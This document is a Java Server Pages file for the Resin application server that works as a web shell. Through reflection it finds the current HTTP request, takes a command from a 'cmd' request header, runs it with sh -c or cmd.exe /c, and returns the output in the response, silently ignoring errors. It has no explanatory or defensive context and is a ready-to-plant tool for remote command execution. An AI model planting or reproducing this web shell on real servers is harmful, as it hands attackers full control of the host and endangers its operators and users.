<%@ page import="java.lang.reflect.Method" %>
<%@ page import="com.caucho.server.http.HttpRequest" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.util.Scanner" %>

<%
    try {
        Field f = Thread.currentThread().getClass().getSuperclass().getDeclaredField("threadLocals");
        f.setAccessible(true);
        Object obj = f.get(Thread.currentThread());
        f = obj.getClass().getDeclaredField("table");
        f.setAccessible(true);
        obj = f.get(obj);
        Object[] obj_arr = (Object[]) obj;
        for(int i = 0; i < obj_arr.length; i++) {
            Object o = obj_arr[i];
            if (o == null) continue;
            f = o.getClass().getDeclaredField("value");
            f.setAccessible(true);
            obj = f.get(o);
            if(obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                HttpRequest httpRequest = (HttpRequest) obj;
                Object httpResponse = httpRequest.getResponseFacade();
                Method getWriterM = httpResponse.getClass().getMethod("getWriter");
                Writer writer = (PrintWriter)getWriterM.invoke(httpResponse);
                Method getHeaderM = httpRequest.getClass().getMethod("getHeader", String.class);
                String cmd = (String)getHeaderM.invoke(httpRequest, "cmd");
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A");
                writer.write(scanner.hasNext() ? scanner.next() : "");
            }
        }
    } catch (Exception e) {

    }
%>
